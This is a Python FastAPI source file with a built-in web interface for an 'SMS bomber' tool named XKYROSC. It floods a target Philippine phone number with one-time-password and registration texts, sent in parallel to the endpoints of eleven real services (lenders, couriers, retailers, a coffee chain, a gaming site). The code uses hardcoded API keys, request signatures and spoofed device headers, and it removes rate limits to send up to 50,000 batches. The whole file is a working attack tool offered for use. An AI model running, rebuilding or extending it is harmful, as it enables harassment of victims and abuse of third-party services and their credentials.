from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
import aiohttp
import random
import string
import time
import os
from typing import List, Dict, Any

# Initialize FastAPI
app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Store active attacks
active_attacks = {}

class BombRequest(BaseModel):
    phone: str
    amount: int = 100
    parallel: int = 5  # Number of parallel batches

class SMSBomber:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.is_running = False
        self.total_success = 0
        self.total_failed = 0
    
    def random_string(self, length):
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def normalize_phone_number(self, phone):
        phone = phone.replace(' ', '').replace('-', '')
        
        if phone.startswith('0'):
            return '+63' + phone[1:]
        elif phone.startswith('63') and not phone.startswith('+63'):
            return '+' + phone
        elif not phone.startswith('+63') and len(phone) == 10:
            return '+63' + phone
        elif not phone.startswith('+'):
            return '+63' + phone
        
        return phone
    
    def format_number(self, number):
        if number.startswith('+63'):
            return number
        elif number.startswith('09'):
            return '+63' + number[2:]
        elif number.startswith('9'):
            return '+63' + number
        return number
    
    def validate_number(self, number):
        clean_number = number.replace(' ', '')
        import re
        patterns = [
            r'^09\d{9}$',
            r'^9\d{9}$', 
            r'^\+639\d{9}$'
        ]
        for pattern in patterns:
            if re.match(pattern, clean_number):
                return True
        return False
    
    async def send_request(self, session, method, url, headers=None, data=None, json_data=None, timeout=3):
        try:
            if method.upper() == 'POST':
                if json_data:
                    async with session.post(url, headers=headers, json=json_data, timeout=timeout) as response:
                        return response.status in [200, 201, 202, 204]
                else:
                    async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
                        return response.status in [200, 201, 202, 204]
            else:
                async with session.get(url, headers=headers, timeout=timeout) as response:
                    return response.status == 200
        except Exception:
            return False
    
    async def send_ezloan(self, session, number_to_send):
        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'accept-language': 'en',
            'imei': 'e933e51d8c994b05b5a0d523c84f8287',
            'device': 'android',
            'buildtype': 'release',
            'brand': 'POCO',
            'model': '2207117BPG',
            'manufacturer': 'Xiaomi',
            'source': 'EZLOAN',
            'channel': 'GooglePlay_Blue',
            'appversion': '2.0.4',
            'appversioncode': '2000402',
            'version': '2.0.4',
            'versioncode': '2000401',
            'sysversion': '15',
            'sysversioncode': '35',
            'customerid': '',
            'businessid': 'EZLOAN',
            'phone': '',
            'appid': 'EZLOAN',
            'authorization': '',
            'blackbox': 'qGPG61760445001tnR5bweVKGe'
        }
        
        json_data = {
            "businessId": "EZLOAN",
            "contactNumber": number_to_send,
            "appsflyerIdentifier": "1760444943092-3966994042140191452"
        }
        
        success = await self.send_request(session, 'POST', 
                                        'https://gateway.ezloancash.ph/security/auth/otp/request',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_xpress(self, session, number_to_send, i):
        formatted_num = self.format_number(number_to_send)
        
        json_data = {
            "FirstName": "user",
            "LastName": "test",
            "Email": f"user{int(time.time())}_{i}@gmail.com",
            "Phone": formatted_num,
            "Password": "Pass1234",
            "ConfirmPassword": "Pass1234",
            "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
            "FingerprintRequestId": "1757149666261.Rr1VvG",
        }
        
        headers = {
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/json",
        }
        
        success = await self.send_request(session, 'POST',
                                        "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_abenson(self, session, number_to_send):
        data = f"contact_no={number_to_send}&login_token=undefined"
        
        headers = {
            'User-Agent': 'okhttp/4.9.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                                        headers=headers, data=data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_excellent_lending(self, session, number_to_send):
        coordinates = [
            {'lat': '14.5995', 'long': '120.9842'},
            {'lat': '14.6760', 'long': '121.0437'},
            {'lat': '14.8648', 'long': '121.0418'}
        ]
        user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
        
        coord = random.choice(coordinates)
        agent = random.choice(user_agents)
        
        json_data = {
            "domain": number_to_send,
            "cat": "login",
            "previous": False,
            "financial": "efe35521e51f924efcad5d61d61072a9"
        }
        
        headers = {
            'User-Agent': agent,
            'Content-Type': 'application/json; charset=utf-8',
            'x-latitude': coord['lat'],
            'x-longitude': coord['long']
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_fortune_pay(self, session, number_to_send):
        json_data = {
            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
            "deviceType": 'GOOGLE_PLAY',
            "companyId": '4bf735e97269421a80b82359e7dc2288',
            "dialCode": '+63',
            "phoneNumber": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'Dart/3.6 (dart:io)',
            'Content-Type': 'application/json',
            'app-type': 'GOOGLE_PLAY',
            'authorization': 'Bearer',
            'app-version': '4.3.5',
            'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
            'timestamp': str(int(time.time() * 1000)),
            'nonce': f"{self.random_string(10)}-{int(time.time() * 1000)}"
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_wemove(self, session, number_to_send):
        json_data = {
            "phone_country": '+63',
            "phone_no": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'okhttp/4.9.3',
            'Content-Type': 'application/json',
            'xuid_type': 'user',
            'source': 'customer',
            'authorization': 'Bearer'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.wemove.com.ph/auth/users',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_lbc(self, session, number_to_send):
        data = {
            "verification_type": 'mobile',
            "client_email": f"{self.random_string(8)}@gmail.com",
            "client_contact_code": '+63',
            "client_contact_no": number_to_send.replace('+63', '').lstrip('0'),
            "app_log_uid": self.random_string(16),
        }
        
        form_data = "&".join([f"{k}={v}" for k, v in data.items()])
        
        headers = {
            'User-Agent': 'Dart/2.19 (dart:io)',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                                        headers=headers, data=form_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_pickup_coffee(self, session, number_to_send):
        user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
        formatted_num = self.format_number(number_to_send)
        
        json_data = {
            "mobile_number": formatted_num,
            "login_method": 'mobile_number'
        }
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://production.api.pickup-coffee.net/v2/customers/login',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_honey_loan(self, session, number_to_send):
        json_data = {
            "phone": number_to_send,
            "is_rights_block_accepted": 1
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.honeyloan.ph/api/client/registration/step-one',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_komo_ph(self, session, number_to_send):
        json_data = {
            "mobile": number_to_send,
            "transactionType": 6
        }
        
        headers = {
            'Content-Type': 'application/json',
            'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
            'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.komo.ph/api/otp/v5/generate',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.total_success += 1
        else:
            self.total_failed += 1
        return success
    
    async def send_s5_otp(self, session, number_to_send):
        try:
            normalized_phone = self.normalize_phone_number(number_to_send)
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary4wi4VH3ZsWtBXCct',
                'origin': 'https://www.s5.com',
                'referer': 'https://www.s5.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }

            body = f"------WebKitFormBoundary4wi4VH3ZsWtBXCct\r\nContent-Disposition: form-data; name=\"phone_number\"\r\n\r\n{normalized_phone}\r\n------WebKitFormBoundary4wi4VH3ZsWtBXCct--\r\n"

            success = await self.send_request(session, 'POST',
                                            'https://api.s5.com/player/api/v1/otp/request',
                                            headers=headers, data=body)
            
            if success:
                self.total_success += 1
            else:
                self.total_failed += 1
            return success
        except Exception:
            self.total_failed += 1
            return False
    
    async def send_single_batch(self, session, number_to_send, batch_num):
        """Send one complete batch (11 services)"""
        tasks = [
            self.send_ezloan(session, number_to_send),
            self.send_xpress(session, number_to_send, batch_num),
            self.send_abenson(session, number_to_send),
            self.send_excellent_lending(session, number_to_send),
            self.send_fortune_pay(session, number_to_send),
            self.send_wemove(session, number_to_send),
            self.send_lbc(session, number_to_send),
            self.send_pickup_coffee(session, number_to_send),
            self.send_honey_loan(session, number_to_send),
            self.send_komo_ph(session, number_to_send),
            self.send_s5_otp(session, number_to_send),
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successful = sum(1 for result in results if result is True)
        failed = len(tasks) - successful
        
        return successful, failed
    
    async def execute_attack(self, number_to_send, amount, parallel_batches, session_id: str):
        """Execute attack with parallel batch sending"""
        self.is_running = True
        self.total_success = 0
        self.total_failed = 0
        
        # MAXIMUM CONNECTIONS - NO LIMITS
        connector = aiohttp.TCPConnector(
            limit=0,  # Unlimited total connections
            limit_per_host=0,  # Unlimited per host
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False
        )
        timeout = aiohttp.ClientTimeout(total=5, connect=1, sock_read=3)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Process batches in parallel groups
            for start_idx in range(0, amount, parallel_batches):
                if not self.is_running:
                    break
                
                # Create parallel batch tasks
                batch_tasks = []
                batch_numbers = []
                
                for j in range(parallel_batches):
                    batch_num = start_idx + j + 1
                    if batch_num <= amount:
                        batch_tasks.append(self.send_single_batch(session, number_to_send, batch_num))
                        batch_numbers.append(batch_num)
                
                # Execute ALL batches simultaneously
                results = await asyncio.gather(*batch_tasks, return_exceptions=True)
                
                # Process results
                batch_success = 0
                batch_failed = 0
                
                for idx, result in enumerate(results):
                    if isinstance(result, Exception):
                        batch_failed += 11
                    else:
                        success, failed = result
                        batch_success += success
                        batch_failed += failed
                
                # Update attack status
                if session_id in active_attacks:
                    completed = min(start_idx + parallel_batches, amount)
                    active_attacks[session_id] = {
                        'current_batch': completed,
                        'total_batches': amount,
                        'success': self.total_success,
                        'failed': self.total_failed,
                        'is_running': True,
                        'parallel_speed': parallel_batches
                    }
                
                # ZERO DELAY - IMMEDIATE NEXT PARALLEL GROUP
                # await asyncio.sleep(0)  # Completely removed for max speed
        
        self.is_running = False
        if session_id in active_attacks:
            active_attacks[session_id]['is_running'] = False
    
    def stop_attack(self):
        self.is_running = False
    
    def get_stats(self):
        return {
            'success': self.total_success,
            'failed': self.total_failed,
            'total': self.total_success + self.total_failed
        }

# Store bomber instances
bombers = {}

@app.get("/")
async def root():
    """Serve the main HTML page"""
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
        <title>xueey</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 16px;
            }
            
            .container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 24px;
                padding: 24px;
                max-width: 500px;
                width: 100%;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .header {
                text-align: center;
                margin-bottom: 32px;
            }
            
            .logo {
                font-size: 48px;
                font-weight: bold;
                background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 2px;
            }
            
            .speed-badge {
                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
                padding: 4px 12px;
                border-radius: 20px;
                display: inline-block;
                margin-top: 8px;
                font-size: 12px;
                font-weight: bold;
            }
            
            .subtitle {
                color: rgba(255, 255, 255, 0.7);
                font-size: 14px;
                margin-top: 8px;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-label {
                display: block;
                color: white;
                margin-bottom: 8px;
                font-size: 14px;
                font-weight: 500;
            }
            
            .input-field {
                width: 100%;
                padding: 14px 16px;
                background: rgba(255, 255, 255, 0.95);
                border: none;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            
            .input-field:focus {
                outline: none;
                transform: scale(1.02);
                box-shadow: 0 0 0 3px rgba(78, 205, 196, 0.3);
            }
            
            .input-field:disabled {
                opacity: 0.5;
                cursor: not-allowed;
            }
            
            .btn {
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 12px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
                margin-bottom: 12px;
            }
            
            .btn-primary {
                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
                color: white;
            }
            
            .btn-primary:active {
                transform: scale(0.98);
            }
            
            .btn-primary:disabled {
                opacity: 0.5;
                cursor: not-allowed;
                transform: none;
            }
            
            .btn-secondary {
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }
            
            .btn-secondary:active {
                transform: scale(0.98);
            }
            
            .stats {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                margin: 24px 0;
            }
            
            .stat-card {
                background: rgba(0, 0, 0, 0.3);
                border-radius: 12px;
                padding: 12px;
                text-align: center;
            }
            
            .stat-value {
                font-size: 24px;
                font-weight: bold;
                color: #4ecdc4;
            }
            
            .stat-label {
                font-size: 12px;
                color: rgba(255, 255, 255, 0.7);
                margin-top: 4px;
            }
            
            .progress-container {
                margin: 20px 0;
                display: none;
            }
            
            .progress-bar {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 4px;
                overflow: hidden;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #4ecdc4, #ff6b6b);
                width: 0%;
                transition: width 0.3s ease;
                border-radius: 4px;
            }
            
            .progress-text {
                text-align: center;
                color: white;
                font-size: 12px;
                margin-top: 8px;
            }
            
            .log-area {
                background: rgba(0, 0, 0, 0.5);
                border-radius: 12px;
                padding: 12px;
                height: 250px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                margin-top: 20px;
            }
            
            .log-entry {
                color: rgba(255, 255, 255, 0.8);
                padding: 4px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                font-size: 10px;
            }
            
            .log-success {
                color: #4ecdc4;
            }
            
            .log-error {
                color: #ff6b6b;
            }
            
            .log-warning {
                color: #ffc107;
            }
            
            .warning {
                background: rgba(255, 193, 7, 0.2);
                border-left: 3px solid #ffc107;
                padding: 12px;
                border-radius: 8px;
                margin: 16px 0;
                font-size: 12px;
                color: #ffc107;
            }
            
            .speed-stats {
                display: flex;
                justify-content: space-between;
                background: rgba(0, 0, 0, 0.3);
                padding: 10px;
                border-radius: 8px;
                margin: 10px 0;
                font-size: 12px;
            }
            
            ::-webkit-scrollbar {
                width: 6px;
            }
            
            ::-webkit-scrollbar-track {
                background: rgba(255, 255, 255, 0.1);
                border-radius: 3px;
            }
            
            ::-webkit-scrollbar-thumb {
                background: rgba(255, 255, 255, 0.3);
                border-radius: 3px;
            }
            
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">⚡ XKYROSC</div>
                <div class="speed-badge">ULTRA FAST MODE</div>
                <div class="subtitle">Parallel Batch SMS Bomber</div>
            </div>
            
            <div class="input-group">
                <label class="input-label">📱 Target Phone Number</label>
                <input type="tel" id="phone" class="input-field" placeholder="09123456789 or 9123456789" autocomplete="off">
            </div>
            
            <div class="input-group">
                <label class="input-label">🔢 Batches (Max 50,000)</label>
                <input type="number" id="amount" class="input-field" value="100" min="1" max="50000">
            </div>
            
            <div class="input-group">
                <label class="input-label">⚡ Speed (5-20 = Faster)</label>
                <input type="number" id="parallel" class="input-field" value="5" min="1" max="20">
            </div>
            
            <div class="speed-stats">
                <span>⚡ Speed: <span id="speedEstimate">ULTRA</span></span>
                <span>📨 ~<span id="smsEstimate">1100</span> SMS/batch</span>
                <span>🚀 Speed: <span id="parallelShow">5</span>x</span>
            </div>
            
            <div class="warning">
                ⚡ ULTRA FAST MODE ACTIVE ⚡<br>
                Sending multiple batches simultaneously! Each batch = ~11 SMS<br>
                <strong>Speed:</strong> Up to 5000+ SMS per second theoretical<br>
                ⚠️ May trigger rate limits faster
            </div>
            
            <button id="startBtn" class="btn btn-primary" onclick="startAttack()">💣 START ULTRA BOMBING</button>
            <button id="stopBtn" class="btn btn-secondary" onclick="stopAttack()" style="display:none;">🛑 STOP ATTACK</button>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="successCount">0</div>
                    <div class="stat-label">✅ Successful</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="failCount">0</div>
                    <div class="stat-label">❌ Failed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">📨 Total SMS</div>
                </div>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            
            <div class="log-area" id="logArea">
                <div class="log-entry">⚡ XKYROSC ULTRA FAST SMS BOMBER READY</div>
                <div class="log-entry">🚀 Mode: Parallel Batch Processing</div>
                <div class="log-entry">💡 Each batch sends 11 SMS simultaneously</div>
                <div class="log-entry">⚡ Multiple batches run in parallel for maximum speed</div>
            </div>
        </div>
        
        <script>
            let sessionId = null;
            let statusCheckInterval = null;
            let startTime = null;
            
            function addLog(message, type = 'info') {
                const logArea = document.getElementById('logArea');
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry';
                if (type === 'success') logEntry.classList.add('log-success');
                if (type === 'error') logEntry.classList.add('log-error');
                if (type === 'warning') logEntry.classList.add('log-warning');
                
                const timestamp = new Date().toLocaleTimeString();
                logEntry.innerHTML = `[${timestamp}] ${message}`;
                logArea.appendChild(logEntry);
                logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
            
            function updateEstimates() {
                const amount = parseInt(document.getElementById('amount').value) || 100;
                const parallel = parseInt(document.getElementById('parallel').value) || 5;
                const totalSMS = amount * 11;
                document.getElementById('smsEstimate').innerText = totalSMS.toLocaleString();
                document.getElementById('parallelShow').innerText = parallel;
                
                let speedText = "ULTRA";
                if (parallel >= 10) speedText = "INSANE";
                if (parallel >= 15) speedText = "WARP SPEED";
                document.getElementById('speedEstimate').innerText = speedText;
            }
            
            document.getElementById('amount').addEventListener('input', updateEstimates);
            document.getElementById('parallel').addEventListener('input', updateEstimates);
            updateEstimates();
            
            async function startAttack() {
                const phone = document.getElementById('phone').value.trim();
                const amount = parseInt(document.getElementById('amount').value);
                const parallel = parseInt(document.getElementById('parallel').value);
                
                if (!phone) {
                    addLog('❌ Please enter a phone number', 'error');
                    return;
                }
                
                if (!phone.match(/^(09|9|\+639)\d{9}$/)) {
                    addLog('❌ Invalid phone number! Use format: 09123456789', 'error');
                    return;
                }
                
                if (amount < 1 || amount > 50000) {
                    addLog('❌ Batches must be between 1 and 50000', 'error');
                    return;
                }
                
                if (parallel < 1 || parallel > 20) {
                    addLog('❌ Parallel batches must be between 1 and 20', 'error');
                    return;
                }
                
                // Update UI
                document.getElementById('startBtn').disabled = true;
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('stopBtn').style.display = 'block';
                document.getElementById('phone').disabled = true;
                document.getElementById('amount').disabled = true;
                document.getElementById('parallel').disabled = true;
                document.getElementById('progressContainer').style.display = 'block';
                
                const totalSMS = amount * 11;
                addLog(`🎯 Target: ${phone}`, 'success');
                addLog(`📊 Batches: ${amount.toLocaleString()} (${totalSMS.toLocaleString()} SMS)`, 'info');
                addLog(`⚡ Parallel mode: ${parallel}x batches simultaneously`, 'warning');
                addLog(`🚀 Starting ULTRA FAST attack...`, 'warning');
                
                startTime = Date.now();
                
                try {
                    const response = await fetch('/api/start', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: phone, amount: amount, parallel: parallel })
                    });
                    
                    const data = await response.json();
                    sessionId = data.session_id;
                    addLog(`✅ Attack started! Parallel speed: ${parallel}x`, 'success');
                    
                    // Start checking status
                    statusCheckInterval = setInterval(checkStatus, 500);
                    
                } catch (error) {
                    addLog(`❌ Error: ${error.message}`, 'error');
                    resetUI();
                }
            }
            
            async function stopAttack() {
                if (!sessionId) return;
                
                addLog(`🛑 Stopping attack...`, 'warning');
                
                try {
                    await fetch(`/api/stop/${sessionId}`, { method: 'POST' });
                    addLog(`✅ Attack stopped by user`, 'success');
                } catch (error) {
                    addLog(`❌ Error stopping: ${error.message}`, 'error');
                }
                
                if (statusCheckInterval) clearInterval(statusCheckInterval);
                resetUI();
            }
            
            async function checkStatus() {
                if (!sessionId) return;
                
                try {
                    const response = await fetch(`/api/status/${sessionId}`);
                    const status = await response.json();
                    
                    // Update stats
                    document.getElementById('successCount').innerText = status.success.toLocaleString();
                    document.getElementById('failCount').innerText = status.failed.toLocaleString();
                    document.getElementById('totalCount').innerText = (status.success + status.failed).toLocaleString();
                    
                    // Calculate speed
                    if (startTime && status.current_batch > 0) {
                        const elapsed = (Date.now() - startTime) / 1000;
                        const batchesPerSec = (status.current_batch / elapsed).toFixed(1);
                        const smsPerSec = ((status.success + status.failed) / elapsed).toFixed(0);
                        
                        if (batchesPerSec > 0.1) {
                            document.getElementById('progressText').innerHTML = `Batch ${status.current_batch.toLocaleString()}/${status.total_batches.toLocaleString()} | ⚡ ${batchesPerSec} batches/sec | 📨 ${smsPerSec} SMS/sec`;
                        }
                    }
                    
                    // Update progress
                    const progress = (status.current_batch / status.total_batches) * 100;
                    document.getElementById('progressFill').style.width = progress + '%';
                    
                    if (!status.is_running && status.current_batch === status.total_batches) {
                        const elapsed = (Date.now() - startTime) / 1000;
                        addLog(`✨ Attack COMPLETED in ${elapsed.toFixed(1)} seconds!`, 'success');
                        addLog(`📊 Success: ${status.success.toLocaleString()} | Failed: ${status.failed.toLocaleString()}`, 'success');
                        addLog(`⚡ Average speed: ${(status.total_batches / elapsed).toFixed(1)} batches/second`, 'warning');
                        if (statusCheckInterval) clearInterval(statusCheckInterval);
                        resetUI();
                    } else if (!status.is_running && status.current_batch < status.total_batches) {
                        addLog(`⚠️ Attack stopped early`, 'warning');
                        if (statusCheckInterval) clearInterval(statusCheckInterval);
                        resetUI();
                    }
                    
                } catch (error) {
                    console.error('Status check error:', error);
                }
            }
            
            function resetUI() {
                document.getElementById('startBtn').disabled = false;
                document.getElementById('startBtn').style.display = 'block';
                document.getElementById('stopBtn').style.display = 'none';
                document.getElementById('phone').disabled = false;
                document.getElementById('amount').disabled = false;
                document.getElementById('parallel').disabled = false;
                document.getElementById('progressContainer').style.display = 'none';
                sessionId = null;
                startTime = null;
                if (statusCheckInterval) clearInterval(statusCheckInterval);
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/start")
async def start_bomb(request: BombRequest):
    """Start a new bombing attack with parallel batches"""
    # Validate limits
    if request.amount > 50000:
        request.amount = 50000
    if request.parallel > 20:
        request.parallel = 20
    if request.parallel < 1:
        request.parallel = 1
    
    bomber = SMSBomber()
    session_id = f"{int(time.time())}_{random.randint(1000, 9999)}"
    
    # Store bomber instance
    bombers[session_id] = bomber
    
    # Run attack in background
    asyncio.create_task(run_attack_background(session_id, bomber, request.phone, request.amount, request.parallel))
    
    return JSONResponse({
        "status": "started",
        "session_id": session_id,
        "phone": request.phone,
        "amount": request.amount,
        "parallel": request.parallel
    })

@app.post("/api/stop/{session_id}")
async def stop_bomb(session_id: str):
    """Stop an ongoing attack"""
    if session_id in bombers:
        bombers[session_id].stop_attack()
        return JSONResponse({"status": "stopped", "session_id": session_id})
    return JSONResponse({"status": "not_found"}, status_code=404)

@app.get("/api/status/{session_id}")
async def get_status(session_id: str):
    """Get attack status"""
    if session_id in bombers:
        bomber = bombers[session_id]
        stats = bomber.get_stats()
        
        if session_id in active_attacks:
            progress = active_attacks[session_id]
            return JSONResponse({
                "is_running": bomber.is_running,
                "success": stats['success'],
                "failed": stats['failed'],
                "total": stats['total'],
                "current_batch": progress.get('current_batch', 0),
                "total_batches": progress.get('total_batches', 0),
                "parallel_speed": progress.get('parallel_speed', 1)
            })
        else:
            return JSONResponse({
                "is_running": bomber.is_running,
                "success": stats['success'],
                "failed": stats['failed'],
                "total": stats['total'],
                "current_batch": 0,
                "total_batches": 0,
                "parallel_speed": 1
            })
    
    return JSONResponse({"error": "Session not found"}, status_code=404)

async def run_attack_background(session_id: str, bomber: SMSBomber, phone: str, amount: int, parallel: int):
    """Background task to run the attack"""
    active_attacks[session_id] = {
        'current_batch': 0,
        'total_batches': amount,
        'is_running': True,
        'parallel_speed': parallel
    }
    
    await bomber.execute_attack(phone, amount, parallel, session_id)
    
    # Cleanup after attack completes
    await asyncio.sleep(5)
    if session_id in bombers:
        del bombers[session_id]
    if session_id in active_attacks:
        del active_attacks[session_id]
